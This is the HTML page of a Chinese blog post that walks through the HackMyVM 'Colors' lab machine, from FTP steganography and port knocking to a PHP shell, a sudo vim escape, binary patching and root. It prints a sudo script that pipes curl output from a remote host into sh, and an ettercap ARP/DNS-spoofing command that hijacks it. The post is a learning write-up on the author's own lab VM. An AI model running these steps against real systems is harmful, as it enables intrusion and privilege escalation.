@@ -1,0 +1,649 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="一直游到海水变蓝">
+    <meta name="author" content="FLow">
+    
+    <title>
+        
+            hackmyvm Colors复盘 |
+        
+        Flowww&#39;s blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/aaa.png">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.xml"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#000033","title":"Flowww's blog","author":"FLow","avatar":"https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/aaa.png","logo":"https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/aaa.png","favicon":"https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/aaa.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","about":"/about"},"first_screen":{"enable":true,"background_img":"/image/bg.svg","background_img_dark":"/images/bg.svg","description":"一直游到海水变蓝","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":true,"post_datetime":"created"},"post":{"author_badge":{"enable":false,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":false},"datetime_format":"YYYY-MM-DD","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":true,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":false,"site_pv":false,"page_pv":true}},"search":{"path":"search.json","field":"post","content":true,"format":"striptags"},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"icp":{"enable":false,"record_code":null,"url":"https://beian.miit.gov.cn"},"site_deploy":{"enable":false,"provider":"github","url":null},"shields_style":{"enable":false,"custom":[{"link_url":null,"img_url":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.1.0"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/aaa.png">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               Flowww&#39;s blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                
+                                首页
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                
+                                归档
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                
+                                标签
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/"
+                    >首页</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives"
+                    >归档</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags"
+                    >标签</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about"
+                    >关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        hackmyvm Colors复盘
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/aaa.png">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">FLow</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2024-03-20</span>
+            </span>
+
+            <span class="meta-info-item post-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="datetime" data-updated="Thu Mar 21 2024 01:06:18 GMT+0800">2024-03-21</span>
+            </span>
+        
+
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/hackmyvm/">hackmyvm</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E5%A4%8D%E7%9B%98%E5%AD%A6%E4%B9%A0/">复盘学习</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body">
+                    
+
+                    <h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>这个靶场涉及的知识点比较多，思路是大部分学习其他师傅的wp的，写复盘是想记录思路顺便回顾学好每个知识点。</p>
+<h4 id="启动前准备"><a href="#启动前准备" class="headerlink" title="启动前准备"></a>启动前准备</h4><p>由于<strong>网卡配置不同</strong>，我每次都需要开靶机刚开启的时候shift+e进入grub编辑，给一个root的&#x2F;bin&#x2F;bash启动编辑一下&#x2F;etc&#x2F;netwrok&#x2F;interfaces里面的网卡配置，这是前置背景。</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320144812.png" ></p>
+<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   target="_blank" rel="noopener" href="https://hackmyvm.eu/machines/machine.php?vm=Colors" >https://hackmyvm.eu/machines/machine.php?vm=Colors<i class="fas fa-external-link-alt"></i></a></p>
+<p>难度：medium</p>
+<p>ip：192.168.64.92</p>
+<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>nmap扫到21、22、80端口，并且22端口被过滤了（注意这里要用root扫如果用普通用户扫扫不到22端口信息）</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320154203.png" ></p>
+<p>先访问80端口</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320154338.png" ></p>
+<p>只有一张图片，扫目录一无所获，也对图片分析不出什么内容</p>
+<p>看看21号端口</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320154455.png" ></p>
+<p>看起来可以用anonymous登陆，登陆一下</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320154607.png" ></p>
+<p>把secret.jpg下载下来，使用stegseek分析一波</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320155012.png" ></p>
+<p>搞出来一段字符，在cyberchef分析，是base85</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320155123.png" ></p>
+<p>得到一个pink的账号密码，这个时候我的思路是去登陆22端口，但是它的端口filted，后来去看了wp才知道这里有一个端口敲门，ftp那里就给了提示（好神奇的点子）</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2015.54.39.png" ></p>
+<p>1127，1039，1081分别对应first，second，third敲门顺序，按顺序敲门端口才会打开，类似情况之前做vuln的DC系列的靶机也遇到过。</p>
+<h5 id="一个问题"><a href="#一个问题" class="headerlink" title="一个问题"></a>一个问题</h5><p>知道了这个思路，我按照常规思路knock三个端口，然而22端口没有按照预期的打开，我试了很多次，还是失败，也不知道原因。第二天为了想实践后面的关卡，想着干脆关了防火墙，所以借助grub登陆root，按照网上给的命令总是失败，更头疼了。然后就想看看knock的配置文件，找到日志文件，一看到enp0s3我就想到要改成enp01，思路就来了。</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2014.56.31.png" ></p>
+<p>于是经过一番搜索，找到&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;knockd.service，把里面的enp0s3改成enp0s1，再启动靶机</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2015.24.31.png" ></p>
+<p>这次就可以了</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320160752.png" ></p>
+<p>虽然这个问题是针对自己的电脑产生的，别人的电脑可能不会出现这样的情况，但是整个过程是自己一点一点摸索到，最后成功解决的时候真的很开心，所以值得记录一下。</p>
+<h4 id="获得shell"><a href="#获得shell" class="headerlink" title="获得shell"></a>获得shell</h4><p>ok解决了ssh的问题，想用之前拿到的pink账号密码登陆，还是失败</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320161201.png" ></p>
+<p>报错说publickey，说明需要密钥文件登陆。搞半天pink的账号密码可以用ftp登陆，对ftp的敏感度还不够，一直没想到，登陆后</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320161544.png" ></p>
+<p>pink目录下有.ssh目录，<strong>思路是在里面上传自己kali的id_rsa.pub（命名为authorized_keys)，然后用那个文件为凭证自己kali登陆ssh</strong></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320161803.png" ></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320161819.png" ></p>
+<p>登陆成功</p>
+<h4 id="提权过程"><a href="#提权过程" class="headerlink" title="提权过程"></a>提权过程</h4><p>拿到pink的shell后没能发现什么，接下来的思路是去到&#x2F;var&#x2F;www&#x2F;html上传一个a.php，再在网页端访问a.php，就拿到www-data的shell</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320212842.png" ></p>
+<p>Sudo -l查看到green有vim可以利用提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u green /usr/bin/vim</span><br></pre></td></tr></table></figure>
+
+<p>再输入’:!&#x2F;bin&#x2F;sh’，成功拿到green的shell</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320213122.png" ></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">green@color:/var/www/html$ <span class="built_in">cd</span> /home/green</span><br><span class="line"><span class="built_in">cd</span> /home/green</span><br><span class="line">green@color:~$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">note.txt  test_4_green</span><br><span class="line">green@color:~$ <span class="built_in">cat</span> no</span><br><span class="line"><span class="built_in">cat</span> note.txt</span><br><span class="line">You<span class="string">&#x27;ve been working very well lately Green, so I&#x27;</span>m going to give you one last <span class="built_in">test</span>. If you pass it I<span class="string">&#x27;ll give you the password for purple.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-root</span></span><br><span class="line"><span class="string">green@color:~$ ./test_4_green</span></span><br><span class="line"><span class="string">./test_4_green</span></span><br><span class="line"><span class="string">Guess the number im thinking: 1</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">Nope, sorry</span></span><br><span class="line"><span class="string">green@color:~$</span></span><br></pre></td></tr></table></figure>
+
+<p>到green到家目录下大致可以利用的就是test_4_green，下载到本地，ida打开查看一下</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2021.48.22.png" ></p>
+<p>注意到有个jnz比较</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2021.50.38.png" ></p>
+<p>大致就是比较v8和v7，这里用ida修改一下jnz为jz</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320215526.png" ></p>
+<p>保存后再执行，随便输入一个数字也会爆出密码</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2021.57.24.png" ></p>
+<p>接着就登陆purple账户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">purple@color:~$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> purple on color:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User purple may run the following commands on color:</span><br><span class="line">    (root) NOPASSWD: /attack_dir/ddos.sh</span><br><span class="line">purple@color:~$ <span class="built_in">cat</span> /attack_dir/ddos.sh</span><br><span class="line"><span class="built_in">cat</span> /attack_dir/ddos.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">/usr/bin/curl http://masterddos.hmv/attack.sh | /usr/bin/sh -p</span><br></pre></td></tr></table></figure>
+
+<p>sudo -l发现有个脚本可以用，就是要下载masterddos.hmv下的attack.sh然后交给&#x2F;usr&#x2F;bin&#x2F;sh 执行</p>
+<p><strong>思路是利用dns欺骗，让靶机向自己的kali发送请求，自己的kali伪造一个attack.sh，让靶机访问</strong></p>
+<p>步骤：</p>
+<p>先在修改&#x2F;etc&#x2F;ettercap&#x2F;etter.dns文件，增加</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masterddos.hmv A 192.168.64.3</span><br></pre></td></tr></table></figure>
+
+<p>然后开始dns攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -i eth0 -Tp -M arp:remote -P dns_spoof /192.168.64.92// /192.168.64.1//</span><br></pre></td></tr></table></figure>
+
+<p>在靶机去ping masterddos.hmv，回复的ip是kali的ip，DNS欺骗执行成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">purple@color:~$ ping masterddos.hmv</span><br><span class="line">ping masterddos.hmv</span><br><span class="line">PING masterddos.hmv (192.168.64.3) 56(84) bytes of data.</span><br><span class="line">64 bytes from 192.168.64.3 (192.168.64.3): icmp_seq=1 ttl=64 time=1.49 ms</span><br><span class="line">64 bytes from 192.168.64.3 (192.168.64.3): icmp_seq=2 ttl=64 time=0.915 ms</span><br><span class="line">64 bytes from 192.168.64.3 (192.168.64.3): icmp_seq=3 ttl=64 time=0.972 ms</span><br><span class="line">64 bytes from 192.168.64.3 (192.168.64.3): icmp_seq=4 ttl=64 time=1.08 ms</span><br><span class="line">64 bytes from 192.168.64.3 (192.168.64.3): icmp_seq=5 ttl=64 time=0.681 ms</span><br></pre></td></tr></table></figure>
+
+<p>接着就sudo &#x2F;attack_dir&#x2F;ddos.sh执行脚本</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320222448.png" ></p>
+<p>成功拿到root的shell，提权成功。</p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>第一次遇到<strong>DNS欺骗</strong>，学到了，通过ftp敲门那里思路比较清奇，要打破惯性思维，不要一看到账号密码只想到ssh的网页，还有ftp！可执行文件修改（二进制方向的魅力），knock开端口（注意网卡配置）。</p>
+<p>这么理下来知识点也不是特别多，但我就要消化好久，自己做的时候没办法想到的思路无非就是因为知识面不够广，还有就是脑子不够灵活（比如没想到拿账号密码登陆ftp），路漫漫。</p>
+
+                </div>
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/hackmyvm/">hackmyvm</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E5%A4%8D%E7%9B%98%E5%AD%A6%E4%B9%A0/">复盘学习</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2024/03/18/hackmyvm-casino%E5%A4%8D%E7%9B%98/"
+                                   title="hackmyvm casino复盘"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">hackmyvm casino复盘</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="nav-number">1.</span> <span class="nav-text">写在前面</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%90%AF%E5%8A%A8%E5%89%8D%E5%87%86%E5%A4%87"><span class="nav-number">2.</span> <span class="nav-text">启动前准备</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="nav-number">3.</span> <span class="nav-text">靶机信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">4.</span> <span class="nav-text">信息搜集</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%80%E4%B8%AA%E9%97%AE%E9%A2%98"><span class="nav-number">4.1.</span> <span class="nav-text">一个问题</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%BE%97shell"><span class="nav-number">5.</span> <span class="nav-text">获得shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B"><span class="nav-number">6.</span> <span class="nav-text">提权过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">7.</span> <span class="nav-text">总结</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="border-box website-info-box default">
+        
+            <div class="copyright-info info-item default">
+                &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2024
+                
+                    &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">FLow</a>
+                
+            </div>
+
+            <div class="theme-info info-item default">
+                由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+            </div>
+
+            
+
+            
+        
+
+        <div class="count-item info-item default">
+            
+
+            
+
+            
+        </div>
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="tools-list border-box">
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-toggle-theme-mode flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="nav-number">1.</span> <span class="nav-text">写在前面</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%90%AF%E5%8A%A8%E5%89%8D%E5%87%86%E5%A4%87"><span class="nav-number">2.</span> <span class="nav-text">启动前准备</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="nav-number">3.</span> <span class="nav-text">靶机信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">4.</span> <span class="nav-text">信息搜集</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%80%E4%B8%AA%E9%97%AE%E9%A2%98"><span class="nav-number">4.1.</span> <span class="nav-text">一个问题</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%BE%97shell"><span class="nav-number">5.</span> <span class="nav-text">获得shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B"><span class="nav-number">6.</span> <span class="nav-text">提权过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">7.</span> <span class="nav-text">总结</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+<!-- common -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local-search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="">
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+
+
+</body>
+</html>
